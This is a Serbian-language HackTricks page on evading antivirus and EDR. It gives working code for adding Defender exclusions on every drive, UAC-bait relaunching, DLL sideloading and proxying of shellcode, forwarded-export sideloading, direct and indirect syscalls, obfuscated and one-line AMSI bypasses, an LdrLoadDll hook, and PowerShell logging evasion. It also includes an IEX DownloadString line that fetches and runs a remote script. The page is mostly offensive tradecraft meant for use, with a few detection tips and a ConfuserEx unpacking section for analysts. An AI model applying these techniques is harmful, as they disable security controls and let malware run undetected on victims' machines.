# Zaobilaženje antivirusnog softvera (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defendera uz lažno predstavljanje drugog AV-a.
- [Onemogućavanje Defendera ako ste administrator](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalera pre petljanja sa Defenderom

Javni loaderi koji se predstavljaju kao varalice za igre često dolaze u obliku nepotpisanih Node.js/Nexe instalera koji prvo **traže od korisnika povišene privilegije**, a tek zatim onesposobljavaju Defender. Postupak je jednostavan:

1. Proverite da li je kontekst administratorski pomoću komande `net session`. Komanda uspeva samo kada korisnik ima administratorska prava, pa neuspeh znači da se loader pokreće kao standardni korisnik.
2. Odmah ponovo pokrenite program pomoću glagola `RunAs` da biste prikazali očekivani UAC prompt za potvrdu, uz očuvanje originalne komandne linije.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Žrtve već veruju da instaliraju „crackovan“ softver, pa obično prihvate prompt, čime malware dobija potrebna prava da promeni Defender-ovu politiku.<sup>[[26]](#references)</sup>

### Blanket `MpPreference` exclusions za svako slovo diska

Kada dobije povišene privilegije, GachiLoader-style lanci maksimalno iskorišćavaju slepe tačke Defender-a umesto da potpuno isključe servis. Loader prvo gasi GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široka izuzeća**, tako da se svaki korisnički profil, sistemski direktorijum i prenosivi disk ne mogu skenirati:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ključna zapažanja:

- Petlja prolazi kroz svaki montirani sistem datoteka (D:\, E:\, USB memorije itd.), tako da se **svaki budući payload sačuvan bilo gde na disku ignoriše**.
- Izuzimanje ekstenzije `.sys` služi za ubuduće — napadači zadržavaju mogućnost da kasnije učitaju nepotpisane drajvere bez ponovnog diranja Defendera.
- Sve izmene se nalaze pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su izuzimanja sačuvana ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedna Defender usluga nije zaustavljena, naivne provere stanja i dalje prijavljuju da je „antivirus aktivan“, iako provera u realnom vremenu nikada ne obuhvata te putanje.<sup>[[26]](#references)</sup>

## **Metodologija izbegavanja AV-a**

Trenutno AV alati koriste različite metode za proveru da li je neka datoteka zlonamerna: statičko otkrivanje, dinamičku analizu, a napredniji EDR sistemi i analizu ponašanja.

### **Statičko otkrivanje**

Statičko otkrivanje se postiže označavanjem poznatih zlonamernih nizova znakova ili nizova bajtova u binarnoj datoteci ili skripti, kao i izdvajanjem informacija iz same datoteke (npr. opisa datoteke, naziva kompanije, digitalnih potpisa, ikone, kontrolne sume itd.). To znači da vas korišćenje poznatih javnih alata može lakše dovesti do otkrivanja, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ovakvo otkrivanje:

- **Enkripcija**

Ako šifrujete binarnu datoteku, AV neće moći da otkrije vaš program, ali biće vam potreban neki loader koji će dešifrovati i pokrenuti program u memoriji.

- **Obfuskacija**

Ponekad je dovoljno samo da izmenite neke nizove znakova u binarnoj datoteci ili skripti kako biste je provukli pored AV-a, ali to može da oduzme dosta vremena, u zavisnosti od toga šta pokušavate da obfuscirate.

- **Prilagođeni alati**

Ako razvijate sopstvene alate, neće postojati poznati zlonamerni potpisi, ali za to je potrebno mnogo vremena i truda.

> [!TIP]
> Dobar način da proverite kako Windows Defender obavlja statičko otkrivanje jeste [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On deli datoteku na više segmenata, a zatim zadaje Defenderu da svaki od njih skenira pojedinačno. Tako vam može tačno reći koji su nizovi znakova ili bajtovi u vašoj binarnoj datoteci označeni.

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom izbegavanju AV-a.

### **Dinamička analiza**

Dinamička analiza je kada AV pokrene vašu binarnu datoteku u sandboxu i prati zlonamerne aktivnosti (npr. pokušaj dešifrovanja i čitanja lozinki iz pregledača ili pravljenje minidump-a procesa LSASS itd.). Sa ovim može biti malo teže raditi, ali evo nekoliko stvari koje možete da uradite da biste izbegli sandboxe.

- **Čekanje pre izvršavanja** U zavisnosti od načina implementacije, ovo može biti odličan način za zaobilaženje dinamičke analize AV-a. AV alati imaju veoma malo vremena za skeniranje datoteka kako ne bi prekidali korisnikov rad, pa duga čekanja mogu da ometu analizu binarnih datoteka. Problem je što mnogi AV sandboxi mogu jednostavno da preskoče čekanje, u zavisnosti od načina na koji je implementirano.
- **Provera resursa računara** Sandboxi obično imaju vrlo malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore korisnikov računar. Ovde možete biti i veoma kreativni, na primer, proverom temperature CPU-a ili čak brzine ventilatora — sandbox ne mora da podržava sve takve provere.
- **Provere specifične za računar** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu "contoso.local", možete proveriti domen računara da biste videli da li se podudara sa navedenim domenom. Ako se ne podudara, možete naterati program da se ugasi.

Ispostavilo se da je ime računara u Microsoft Defender Sandboxu HAL9TH. Zato pre detonacije možete da proverite ime računara u svom malware-u. Ako se ime podudara sa HAL9TH, znači da ste unutar Defender sandboxa, pa možete naterati program da se ugasi.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za izbegavanje sandboxa

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanal #malware-dev</p></figcaption></figure>

Kao što smo već rekli u ovoj objavi, **javni alati** će pre ili kasnije **biti otkriveni**, pa bi trebalo da se zapitate:

Na primer, ako želite da izbacite LSASS, **da li zaista morate da koristite mimikatz**? Ili biste mogli da upotrebite neki manje poznat projekat koji takođe izbacuje LSASS.

Verovatno je tačno ovo drugo. Uzmimo mimikatz za primer: verovatno je to jedan od najčešće označavanih komada malware-a, ako ne i najčešće označavani, među AV i EDR alatima. Iako je sam projekat sjajan, veoma je teško raditi s njim i zaobići AV alate, pa samo potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate payloade radi izbegavanja otkrivanja, obavezno **isključite automatsko slanje uzoraka** u Defenderu i, molim vas, ozbiljno, **NEMOJTE OTPREMATI NA VIRUSTOTAL** ako želite da izbegavanje otkrivanja uspe i na duže staze. Ako želite da proverite da li određeni AV otkriva vaš payload, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i tamo ga testirajte dok ne budete zadovoljni rezultatom.

## EXE-ovi naspram DLL-ova

Kad god je to moguće, za izbegavanje otkrivanja uvek **dajte prednost DLL-ovima**. Prema mom iskustvu, DLL datoteke se obično **mnogo ređe otkrivaju** i analiziraju, pa je ovo veoma jednostavan trik za izbegavanje otkrivanja u nekim slučajevima (ako vaš payload može da se pokrene kao DLL, naravno).

Kao što možemo da vidimo na ovoj slici, DLL payload iz Havoca ima stopu otkrivanja 4/26 na antiscan.me, dok EXE payload ima stopu otkrivanja 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>poređenje na antiscan.me običnog Havoc EXE payload-a sa običnim Havoc DLL-om</p></figcaption></figure>

Sada ćemo pokazati nekoliko trikova koje možete da primenite sa DLL datotekama kako biste bili mnogo neupadljiviji.

## DLL Sideloading & Proxying

**DLL Sideloading** iskorišćava redosled pretrage DLL-ova koji koristi loader, tako što se ranjiva aplikacija i zlonamerni payload-i postavljaju jedan pored drugog.

Programе podložne DLL Sideloading-u možete potražiti pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće powershell skripte:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ova komanda će prikazati listu programa unutar „C:\Program Files\\“ koji su podložni DLL hijacking-u i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da sami **istražite programe podložne DLL Hijack/Sideload-u**. Ova tehnika može biti prilično neupadljiva ako se pravilno izvede, ali ako koristite javno poznate programe podložne DLL Sideload-u, lako možete biti otkriveni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku pod nazivom **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i zlonamernog) DLL-a na originalni DLL, čime se čuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/flangvik/).

Ovo su koraci koje sam pratio:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Poslednja komanda će nam dati 2 fajla: predložak izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I shellcode-ot (enkodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je ovo uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Svakako preporučujem** da pogledate [S3cur3Th1sShit-ov twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), kako biste detaljnije saznali više o onome o čemu smo razgovarali.

### Zloupotreba prosleđenih izvoza (ForwardSideLoading)

Windows PE moduli mogu da izvoze funkcije koje su zapravo „forwarders“: umesto da upućuje na kod, unos izvoza sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivalac razreši izvoz, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Važno je razumeti sledeća ponašanja:
- Ako je `TargetDll` KnownDLL, učitava se iz zaštićenog KnownDLLs prostora imena (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji obuhvata direktorijum modula koji obavlja prosleđivanje.

Ovo omogućava primitivu za indirektni sideloading: pronađite potpisani DLL koji izvozi funkciju prosleđenu modulu čije ime nije KnownDLL, a zatim smestite taj potpisani DLL zajedno sa DLL-om pod kontrolom napadača koji ima potpuno isto ime kao prosleđeni ciljni modul. Kada se pozove prosleđena funkcija, loader razrešava prosleđivanje i učitava vaš DLL iz istog direktorijuma, čime se izvršava ваш DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen u Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nije KnownDLL, pa se pronalazi prema uobičajenom redosledu pretrage.

PoC (kopiraj-nalepi):
1) Kopirajte potpisani sistemski DLL u folder u koji može da se upisuje.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u istu fasciklu. Minimalni DllMain je dovoljan za izvršavanje koda; ne morate da implementirate prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Dok razrešava `KeyIsoSetAuditingInterface`, loader prati prosleđivanje do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, greška „missing API“ pojaviće se tek nakon što je `DllMain` već pokrenut

Saveti za lov:
- Fokusirajte se na prosleđene exports gde ciljni modul nije KnownDLL. KnownDLL-ovi su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Prosleđene exports možete nabrojati pomoću alata kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwarder-a da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove sa putanja van sistemskih, a zatim učitavaju DLL-ove koji nisu KnownDLLs, sa istim osnovnim imenom, iz tog direktorijuma
- Upozoravajte na lance procesa/modula kao što je: `rundll32.exe` → `keyiso.dll` van sistemskih putanja → `NCRYPTPROV.dll` u putanjama u koje korisnik može da upisuje
- Sprovodite politike integriteta koda (WDAC/AppLocker) i zabranite upisivanje i izvršavanje u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze za učitavanje i izvršavanje shellcode-a na prikriven način.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša: ono što radi danas može biti otkriveno sutra, zato se nikada ne oslanjajte na samo jedan alat i, ako je moguće, pokušajte da povežete više tehnika za evasion.

## Direct/Indirect Syscalls i razrešavanje SSN-a (SysWhispers4)

EDR-ovi često postavljaju **inline hook-ove u user mode-u** na syscall stub-ove u `ntdll.dll`. Da biste zaobišli te hook-ove, možete da generišete **direct** ili **indirect** syscall stub-ove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja zakačene ulazne tačke export-a.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: ubacuje instrukciju `syscall`/`sysenter`/`SVC #0` u generisani stub (ne poziva export iz `ntdll`-a).
- **Indirect**: skače na postojeći `syscall` gadget unutar `ntdll`-a, tako da izgleda kao da prelaz u kernel mode potiče iz `ntdll`-a (korisno za evasion zasnovan na heuristikama); **randomized indirect** bira gadget iz skupa pri svakom pozivu.
- **Egg-hunt**: izbegava ugrađivanje statičkog niza opcode-ova `0F 05` na disk; pronalazi syscall sekvencu tokom izvršavanja.

**Strategije za razrešavanje SSN-a otporne na hook-ove:**
- **FreshyCalls (VA sort)**: zaključuje SSN-ove sortiranjem syscall stub-ova prema virtuelnoj adresi, umesto čitanjem bajtova stub-a.
- **SyscallsFromDisk**: mapira čistu kopiju `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog `.text` segmenta, a zatim je odmapira (zaobilazi sve hook-ove u memoriji).
- **RecycledGate**: kombinuje zaključivanje SSN-a sortiranjem prema VA sa proverom opcode-ova kada je stub čist; ako je zakačen, koristi zaključivanje prema VA.
- **HW Breakpoint**: postavlja DR0 na `syscall` instrukciju i koristi VEH za hvatanje SSN-a iz `EAX` tokom izvršavanja, bez parsiranja zakačenih bajtova.

Primer upotrebe SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči „[malware bez datoteka](https://en.wikipedia.org/wiki/Fileless_malware)“. U početku su AV-ovi mogli da skeniraju samo **datoteke na disku**, pa ako biste nekako mogli da izvršite payload **direktno u memoriji**, AV ne bi mogao ništa da preduzme da to spreči, jer ne bi imao dovoljno uvida.

AMSI funkcija je integrisana u sledeće Windows komponente.

- Kontrola korisničkog naloga ili UAC (povišavanje privilegija za EXE, COM, MSI ili ActiveX instalacije)
- PowerShell (skripte, interaktivno korišćenje i dinamičko izvršavanje koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u nešifrovanom i neobfuskovanom obliku.

Pokretanje komande `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` izazvaće sledeće upozorenje u Windows Defenderu.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje `amsi:` i zatim putanju do izvršne datoteke iz koje je skripta pokrenuta; u ovom slučaju, powershell.exe

Nismo snimili nijednu datoteku na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI-ja.

Pored toga, počevši od **.NET 4.8**, i C# kod se obrađuje kroz AMSI. To utiče čak i na `Assembly.Load(byte[])` za učitavanje izvršavanja u memoriji. Zato se za izvršavanje u memoriji, ako želite da zaobiđete AMSI, preporučuje korišćenje starijih verzija .NET-a (kao što je 4.7.2 ili starija).

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuskacija**

Pošto AMSI uglavnom koristi statičku detekciju, izmena skripti koje pokušavate da učitate može biti dobar način da izbegnete detekciju.

Međutim, AMSI može da ukloni obfuskaciju skripti čak i kada imaju više slojeva, pa obfuskacija može biti loša opcija, u zavisnosti od načina na koji je izvedena. Zbog toga zaobilaženje nije sasvim jednostavno. Ipak, ponekad je dovoljno promeniti nekoliko naziva promenljivih, pa sve zavisi od toga koliko je nešto označeno kao sumnjivo.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell-a (kao i cscript.exe, wscript.exe itd.), moguće ga je lako izmeniti čak i kada se izvršava kao korisnik bez privilegija. Zbog ovog propusta u implementaciji AMSI-ja, istraživači su pronašli više načina da zaobiđu AMSI skeniranje.

**Izazivanje greške**

Ako se inicijalizacija AMSI-ja prinudno ne uspe (`amsiInitFailed`), skeniranje neće biti pokrenuto za trenutni proces. Ovu tehniku je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis za sprečavanje njene šire upotrebe.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bila je potrebna samo jedna linija PowerShell koda da AMSI učini neupotrebljivim u trenutnom PowerShell procesu. AMSI je, naravno, već označio ovu liniju, pa je potrebna određena izmena da bi se ova tehnika koristila.

Evo izmenjenog AMSI bypass-a koji sam preuzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje unosa koji je dostavio korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na ovaj način, rezultat stvarnog skeniranja biće 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike za zaobilaženje AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan bypass nezavisan od jezika je postavljanje user-mode hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je zatraženi modul `amsi.dll`. Zbog toga se AMSI nikada ne učitava i u tom procesu se ne obavljaju skeniranja.<sup>[[23]](#references)</sup>

Pregled implementacije (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Beleške
- Radi u PowerShell-u, WScript/CScript-u i prilagođenim loader-ima (sa bilo čim što bi inače učitalo AMSI).
- Kombinujte sa prosleđivanjem skripti preko stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli artefakte dugih komandnih linija.
- Primećeno je da ga koriste loader-i pokrenuti preko LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skriptu za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skriptu za zaobilaženje AMSI-ja, koja izbegava signature pomoću nasumično generisanih korisnički definisanih funkcija, promenljivih i izraza znakova, kao i nasumične promene veličine slova u PowerShell ključnim rečima.

**Uklanjanje detektovanog signature-a**

Možete da koristite alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da biste uklonili detektovani AMSI signature iz memorije tekućeg procesa. Ovaj alat radi tako što pretražuje memoriju tekućeg procesa u potrazi za AMSI signature-om, a zatim ga prepisuje NOP instrukcijama i time ga efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete da pokrećete skripte bez AMSI skeniranja. To možete uraditi ovako:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. To može biti korisno u svrhe revizije i otklanjanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite PowerShell verziju 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell sesiju**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da biste pokrenuli PowerShell bez pokretanja procesa `powershell.exe` (pristup koji koristi `powerpick` u Cobalt Strike-u). Time se zaobilaze kontrole vezane posebno za proces `powershell.exe`, ali se ne onemogućavaju automatski AMSI, Script Block Logging ni sve druge PowerShell odbrane; obuhvat zavisi od runtime-a i implementacije hosta.


## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuscation oslanja se na šifrovanje podataka, što povećava entropiju binarne datoteke i olakšava AV-ovima i EDR-ovima da je otkriju. Budite oprezni s tim i možda primenite šifrovanje samo na određene delove koda koji su osetljivi ili ih treba sakriti.

### Uklanjanje zaštite ConfuserEx sa .NET binarnih datoteka

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili njegove komercijalne fork-ove), često se nailazi na više slojeva zaštite koji blokiraju decompiler-e i sandbox-ove. Navedeni postupak pouzdano **vraća IL koji je gotovo identičan originalu**, a koji se potom može dekompilirati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1. Uklanjanje anti-tampering zaštite – ConfuserEx šifruje svako *method body* telo i dešifruje ga unutar statičkog konstruktora modula (`<Module>.cctor`). Takođe menja PE checksum, pa će svaka izmena dovesti do pada binarne datoteke. Koristite **AntiTamperKiller** da pronađete šifrovane metadata tabele, vratite XOR ključeve i prepišete čistu assembly datoteku:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpacker-a.

2.  Oporavak simbola / toka kontrole – prosledite *čistu* datoteku alatu **de4dot-cex** (fork alata de4dot prilagođen za ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – izaberite ConfuserEx 2 profil
     • de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i nazive promenljivih i dešifrovati konstantne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda laganim omotačima (poznatim i kao *proxy calls*) kako bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je, kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite rezultujuću binarnu datoteku u dnSpy-ju i potražite velike Base64 blobove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *stvarni* payload.  Malware ga često čuva kao TLV-kodiran niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Ovaj lanac vraća tok izvršavanja **bez** pokretanja zlonamernog uzorka – korisno kada radite na offline radnoj stanici.

> 🛈  ConfuserEx generiše prilagođeni atribut pod nazivom `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### Jednolinijska komanda
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

